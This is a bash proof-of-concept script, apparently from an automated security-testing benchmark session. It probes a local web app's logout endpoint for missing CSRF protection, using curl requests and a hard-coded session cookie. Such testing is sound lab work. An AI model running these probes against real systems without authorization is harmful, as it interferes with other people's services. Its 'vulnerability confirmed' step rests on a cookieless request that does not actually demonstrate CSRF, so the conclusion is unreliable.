#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint - ability to logout user without CSRF token validation
# Target: ./repo
# Created: 2025-11-04T17:32:45.272Z
# Session: benchmark-XBEN-027-24-mhku77j0

# CSRF Vulnerability POC - Logout Endpoint
# This script demonstrates that the logout endpoint processes POST requests
# without requiring CSRF token validation, allowing cross-site logout attacks

TARGET_URL="${1:-http://localhost:8080}"
LOGOUT_ENDPOINT="/logout"

echo "=== CSRF Vulnerability Test on Logout Endpoint ==="
echo "Target: $TARGET_URL$LOGOUT_ENDPOINT"
echo ""

# Test 1: Logout with valid session cookie
echo "[TEST 1] Logout with valid session cookie"
echo "Command: curl -b \"session=eyJ1c2VyX2lkIjoxMDAzMn0.aQo4kg.o3IcQQPY_PbbLVmgVBPEd-oQ0Q8\" -X POST -i $TARGET_URL$LOGOUT_ENDPOINT"
RESPONSE1=$(curl -b "session=eyJ1c2VyX2lkIjoxMDAzMn0.aQo4kg.o3IcQQPY_PbbLVmgVBPEd-oQ0Q8" -X POST -i "$TARGET_URL$LOGOUT_ENDPOINT" 2>/dev/null)
HTTP_CODE1=$(echo "$RESPONSE1" | head -n 1 | grep -oP '\d{3}')
echo "Response HTTP Code: $HTTP_CODE1"
if echo "$RESPONSE1" | grep -q "Set-Cookie"; then
    echo "✓ Session cookie cleared (logout successful)"
fi
echo ""

# Test 2: Logout WITHOUT session cookie (CSRF vulnerability)
echo "[TEST 2] Logout WITHOUT session cookie (CSRF Vulnerability Test)"
echo "Command: curl -X POST -i $TARGET_URL$LOGOUT_ENDPOINT"
RESPONSE2=$(curl -X POST -i "$TARGET_URL$LOGOUT_ENDPOINT" 2>/dev/null)
HTTP_CODE2=$(echo "$RESPONSE2" | head -n 1 | grep -oP '\d{3}')
echo "Response HTTP Code: $HTTP_CODE2"
echo ""

# Test 3: GET request verification (should fail)
echo "[TEST 3] Verify GET request is blocked"
echo "Command: curl -v -X GET $TARGET_URL$LOGOUT_ENDPOINT"
RESPONSE3=$(curl -v -X GET "$TARGET_URL$LOGOUT_ENDPOINT" 2>&1)
HTTP_CODE3=$(echo "$RESPONSE3" | grep "< HTTP" | grep -oP '\d{3}')
echo "Response HTTP Code: $HTTP_CODE3"
if [ "$HTTP_CODE3" = "405" ]; then
    echo "✓ GET requests properly blocked (405 Method Not Allowed)"
fi
echo ""

# Test 4: Verify CSRF vulnerability exists
echo "[TEST 4] CSRF Vulnerability Analysis"
if [ "$HTTP_CODE2" = "302" ] || [ "$HTTP_CODE2" = "200" ]; then
    echo "✓ VULNERABILITY CONFIRMED: Logout processed without session/CSRF token"
    echo "  - POST request without cookies: HTTP $HTTP_CODE2"
    echo "  - No CSRF token required"
    echo "  - No session validation before logout"
    echo ""
    echo "This allows an attacker to craft a malicious page that logs out authenticated users."
    exit 0
else
    echo "✗ Unexpected response code: $HTTP_CODE2"
    echo "  The endpoint may have additional protections"
    exit 1
fi